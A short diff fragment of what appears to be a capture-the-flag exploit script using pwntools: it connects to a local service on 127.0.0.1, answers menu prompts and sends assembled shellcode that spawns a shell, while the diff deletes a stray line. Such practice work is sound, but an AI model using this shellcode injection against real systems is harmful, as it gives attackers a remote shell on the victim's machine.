@@ -6,7 +6,6 @@ io = connect("127.0.0.1",40485)
 
 io.recvuntil(b"wisely!")
 io.sendline('4')
-padd
 io.recvuntil(b"you just set.")
 payload = asm(shellcraft.sh())
 io.sendline(payload)
